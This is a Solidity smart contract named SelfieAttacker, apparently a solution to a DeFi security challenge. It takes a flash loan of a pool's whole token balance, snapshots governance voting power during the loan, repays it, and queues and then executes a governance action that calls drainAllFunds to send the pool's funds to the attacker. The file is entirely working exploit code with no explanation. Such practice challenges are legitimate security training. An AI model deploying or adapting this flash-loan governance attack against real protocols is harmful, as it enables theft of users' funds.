// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IGov {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external;
}

interface IERC20Snapshot is IERC20 {
    function snapshot() external returns (uint256);
}

interface IPool {
    function token() external view returns (IERC20Snapshot);
    function governance() external view returns (IGov);
    function flashLoan(uint256 borrowAmount) external;
}

contract SelfieAttacker {
    address public owner;
    IPool public pool;
    IERC20Snapshot public token;
    IGov public gov;

    uint public actionId;

    constructor(IPool _pool) {
        owner = msg.sender;
        pool = _pool;
        token = pool.token();
        gov = pool.governance();
    }

    function attack1() external {
        uint amount = token.balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    function attack2() external {
        gov.executeAction(actionId);
    }

    function receiveTokens(address, uint256 amount) external {
        token.snapshot();
        token.transfer(address(pool), amount);
        actionId = gov.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
    }
}